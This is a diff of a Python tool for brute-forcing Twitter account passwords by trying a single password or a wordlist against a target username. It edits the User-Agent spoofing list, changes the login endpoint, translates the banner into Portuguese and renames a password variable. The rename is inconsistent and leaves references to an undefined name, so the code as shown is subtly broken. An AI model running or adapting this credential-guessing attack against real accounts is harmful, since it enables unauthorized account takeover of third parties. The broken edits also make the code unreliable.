@@ -49,13 +49,7 @@ def cpro(ip,port=None):
 #### Choice Random User-Agent ####
 def useragent():
     useragents = [
-           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
-           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
-           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
-           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
-           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
-           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
-           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
+           'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36']
     return random.choice(useragents)
 
 def find_form(forms):
@@ -128,10 +122,10 @@ def TBOM(username,wordlist=False,passwd=False,proxy=False):
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
 [>] Target      :> """+wi+username+gr+"""
-{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not passwd else "[>] Password    :> "+yl+str(passwd))+gr+"""
+{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not password else "[>] Password    :> "+yl+str(password))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+gr+"""      
 =================================="""+wi+"""
-[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
+[~] """+yl+"""Brute"""+rd+""" Forçar ATAQUE: """+gr+"""Habilitado """+wi+"""[~]"""+gr+"""
 ==================================
 """)
 	loop = 1
@@ -141,13 +135,13 @@ def TBOM(username,wordlist=False,passwd=False,proxy=False):
 	br.addheaders=[('User-agent',useragent())]
 	issuccess = 0
 	if passwd:
-		if len(passwd) <6:
+		if len(password) <6:
 			print(yl+"\n["+rd+"!"+yl+"] Invalid Password [ "+rd+passwd+yl+" ]"+rd+" !!!"+wi)
 			exit(1)
 		passwd = passwd.strip()
 		try:
 			print(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ] ...")
-			br.open("https://twitter.com/login")
+			br.open("https://twitter.com/sessions")
 			form_id = find_form(br.forms())
 			if form_id == "block":
 				print("[!] Error: Twitter Server Has Block Your Attack !!!")
@@ -159,9 +153,9 @@ def TBOM(username,wordlist=False,passwd=False,proxy=False):
 			if "error" not in br.submit().geturl():
 				issuccess = 1
 				print(wi+"==> Login"+gr+" Success\n")
-				print(wi+"========================="+"="*len(passwd)+"======")
-				print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
-				print(wi+"========================="+"="*len(passwd)+"======")
+				print(wi+"========================="+"="*len(password)+"======")
+				print(wi+"["+gr+"+"+wi+"] Password [ "+gr+password+wi+" ]"+gr+" Is Correct :)")
+				print(wi+"========================="+"="*len(password)+"======")
 			else : print(yl+"==> Login"+rd+" Failed\n")
 		except(KeyboardInterrupt,EOFError):
 			print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
@@ -276,11 +270,6 @@ def Main():
 if __name__=='__main__':
   Main()
 
-##############################################################
-#####################                #########################
-#####################   END OF TOOL  #########################
-#####################                #########################
-##############################################################
-#This Tool by Oseid Aldary
-#Have a nice day :)
-#GoodBye
+#Esta ferramenta de Oseid Aldary
+#Tenha um bom dia :)
+#Adeus
